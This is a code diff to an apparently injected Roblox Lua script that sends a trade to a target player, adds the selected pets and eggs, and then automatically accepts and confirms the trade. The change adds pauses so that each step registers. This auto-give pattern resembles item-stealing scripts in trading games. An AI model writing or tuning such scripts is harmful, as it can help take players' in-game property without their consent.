@@ -459,29 +459,43 @@ local function PZSESN_fake_script() -- userInterface.Userscript
                 sendTradeRemote:FireServer(targetPlayer)
             end)
 
+            -- Wait for the trade to actually open
             task.wait(2)
 
-            -- Fire all selected pets immediately
+            -- Add selected pets
             for _, petId in ipairs(selectedPets:GetChildren()) do
                 if petId:IsA("StringValue") and petId.Value ~= "" then
                     pcall(function()
                         addItemRemote:FireServer(petId.Value)
                     end)
+
+                    task.wait(0.1)
                 end
             end
 
-            -- Fire all selected eggs immediately
+            -- Add selected eggs
             for _, eggId in ipairs(selectedEggs:GetChildren()) do
                 if eggId:IsA("StringValue") and eggId.Value ~= "" then
+                    print("Adding egg:", eggId.Value)
+
                     pcall(function()
                         addItemRemote:FireServer(eggId.Value)
                     end)
+
+                    task.wait(0.1)
                 end
             end
 
-            -- Immediately accept and confirm
+            -- Give the game time to register all items
+            task.wait(1)
+
             pcall(function()
                 AcceptNeg:FireServer()
+            end)
+
+            task.wait(0.5)
+
+            pcall(function()
                 ConfirmTrade:FireServer()
             end)
 
